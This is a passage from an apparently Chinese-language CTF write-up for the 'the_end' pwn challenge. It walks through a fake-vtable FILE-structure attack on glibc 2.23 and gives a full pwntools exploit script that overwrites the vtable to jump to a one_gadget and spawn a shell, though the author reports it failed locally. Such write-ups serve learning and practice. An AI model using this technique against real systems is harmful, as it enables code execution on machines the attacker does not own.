void __fastcall __noreturn main(int a1, char **a2, char **a3){  int i; // [rsp+4h] [rbp-Ch]  void *buf; // [rsp+8h] [rbp-8h] BYREFsleep(0);printf("here is a gift %p, good luck ;)\n", &sleep);fflush(_bss_start);close(1);close(2);  for ( i = 0; i <= 4; ++i )  {read(0, &buf, 8uLL);read(0, buf, 1uLL);  }exit(1337);}
```  
  
  
  
可以看到main函数里开头就打印了sleep函数的地址，我们可以根据这个地址找到libc版本是libc6_2.23-0ubuntu10_amd64  
  
  
此外还有个for循环可以任意地址写入总共5个字节  
  
思路：  
  
● 利用的是在程序调用 exit 后，会遍历 _IO_list_all ，调用IO_2_1_stdout  
下的 vtable 中 _setbuf 函数。  
  
● 可以先修改两个字节在当前 vtable 附近伪造一个 fake_vtable ，然后使用 3 个字节修改 fake_vtable 中 _setbuf 的内容为 one_gadget。  
  
  
我们先查看_IO_2_1_stdout_在libc文件中的偏移，为0x3c5620  
  
```
nm -D libc6_2.23-0ubuntu10_amd64/lib/x86_64-linux-gnu/libc-2.23.so | grep -C 10 _IO_2_1_stdout
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRkHoZw6VqskkfVrdkEtS8BrxtibLmsRIyeDkoZWukhjbicRibIL85d0keQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
再根据vtable跟FILE结构的偏移是0xd8，可以算出vtable的地址是：0x3c56f8。  
  
  
从这里可以看到__setbuf是第12个元素，偏移是11个0x8字节，也就是0x58  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR94drcR7gmeKbojPiacphEx4HZNy3uia9Qicwsu9JxOibBdiazTrTgGUe7Nw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
查看虚表地址附近的内容，我们需要找到一个fake_vtable地址，该地址的0x58偏移是一个libc地址，我们可以把该地址改成one_gadget。也就是fake_vtable_addr + 0x58 = libc_base + onegadget  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneR0wRYGcufvfySIIb5UVk7U6UN92Q8ec4xBUXoeGvibh1S0TmQC0qnQjw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
我们可以把0x7ffff7dd26b8当成fake_vtable地址，然后在0x58偏移的位置伪造onegadget的地址。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRAQNmgBEO0aF2EEqibNWNiaZmM1jGArSxT3RKYicmTgVReznyatWOic5zQw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
one_gadget ./libc6_2.23-0ubuntu10_amd64/lib/x86_64-linux-gnu/libc-2.23.so  
有三个gadget，到时候三个都试一下，看哪个可以。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRTFibK2oPU8Iw0nnhia36T32yK00icRsejJfMcBiau5RcicepzSEJxWtUXSw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRlzdIzyYppbxeuuRhsrnrIXwCTP6WHkTDDvuEjrgClKfuRicXduwtxJw/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
计算一下偏移  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRl7tTqiaxJIicRwQsupuVdrUK5kkjPsbhc5tD9T4aaxXUBVgPvXfWMqZQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
```
from pwn import *context(arch = "amd64", os = "linux", log_level = "debug")io=process("./the_end")libc = ELF("./libc6_2.23-0ubuntu10_amd64/lib/x86_64-linux-gnu/libc-2.23.so")io.recvuntil(b"here is a gift ")sleep_addr = int(io.recvuntil(b',',drop=True),16)log.info(f"sleep --> {hex(sleep_addr)}")io.recv()base = sleep_addr - libc.symbols["sleep"]vtable = base + 0x3c56f8onegadget = base + 0xf02b0fake_vtable = vtable - 0x40target_addr = fake_vtable + 0x58log.info(f"vtable address: {hex(vtable)}")log.info(f"onegadget address: {hex(onegadget)}")log.info(f"fake_vtable address: {hex(fake_vtable)}")log.info(f"target_addr address: {hex(target_addr)}")gdb.attach(io,'b *$rebase(0x955)')pause()for i in range(2):    io.send(p64(vtable+i))    io.send(p8(p64(fake_vtable)[i]))for i in range(3):    io.send(p64(target_addr+i))    io.send(p8(p64(onegadget)[i]))io.sendline(b"exec /bin/sh 1>&0")io.interactive()
```  
  
  
  
调试的时候看到已经把目标地址改成one_gadget地址了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRbXg9ZqPd8AogtSb4QQVA0I7HTyQiazneyO3u2ebhZZYgDiaAnia3UYHsQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
也成功跳转到了onegadget，不知道为什么就是拿不到shell， Got EOF了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8GqPJd2ssePqMrPRia8FoneRicU27EsMm1UoRQwsvkglIaZMIJEox0iclz22ica492DS7grc94e6w1cSQ/640?wx_fmt=png&from=appmsg "")  
![]( "")  
  
  
报了这个错误，AI说是onegadget的条件不满足，三个gadget都试过了也没法，看别人的wp好像也是本地打不通。。。没辙了  
  
```
Breakpoint 2, 0x00007f04ca0452b0 in exec_comm_child (noexec=<optimized out>, showerr=<optimized out>, fildes=0x7ffd10017238, comm=0x7f04ca3158e0 <__elf_set___libc_thread_subfreeres_element_arena_thread_freeres__> "0\240\f\312\004\177") at wordexp.c:876876     wordexp.c: No such file or directory.
```  
  
  
  
参考链接：  
  
https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/  
  
https://ctf-wiki.org/pwn/linux/user-mode/io-file/fake-vtable-exploit/  
  
##   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8Fv6AKzlMQkfRpWPNibEapJdgJRjBm0oadOfzpsicse2s4R01t9ABicibKcibFStzZDBIJibSXsplzhz23g/640?wx_fmt=png&from=appmsg "")  
  
  
看雪ID：  
G0t1T  
  
https://bbs.kanxue.com/user-home-1002337.htm  
  
*本文为看雪论坛精华文章，由   
G0t1T  
   
原创，转载请注明来自看雪社区  
  
[](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458605280&idx=3&sn=b862b079ee38c0e9607690b0574930dc&scene=21#wechat_redirect)  
  
  
  
# 往期推荐  
  
[逆向分析某手游基于异常的内存保护](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458607141&idx=1&sn=4bbcad4c23989173b834046f8852b3b4&scene=21#wechat_redirect)  
  
  
[解决Il2cppapi混淆，通杀DumpUnityCs文件](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606965&idx=1&sn=bf8987b5c86314edd0d5a4a5dd0189dd&scene=21#wechat_redirect)  
  
  
[记录一次Unity加固的探索与实现](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606979&idx=1&sn=e9fdec9d0ff5c4ede515dc302011b74a&scene=21#wechat_redirect)  
  
  
[DLINK路由器命令注入漏洞从1DAY到0DAY](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606963&idx=2&sn=c7265f29dd183dd2b5789254e8d3d979&scene=21#wechat_redirect)  
  
  
[量子安全 quantum ctf Global Hyperlink Zone Hack the box](https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458606863&idx=1&sn=01fd80bfa67b7c7b26254022f0d11e81&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpvJW9icibkZBj9PNBzyQ4d4JFoAKxdnPqHWpMPQfNysVmcL1dtRqU7VyQ/640?wx_fmt=gif&from=appmsg "")  
  
**球在看**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8Hice1nuesdoDZjYQzRMv9tpUHZDmkBpJ4khdIdVhiaSyOkxtAWuxJuTAs8aXISicVVUbxX09b1IWK0g/640?wx_fmt=gif&from=appmsg "")  
  
点击阅读原文查看更多  
  
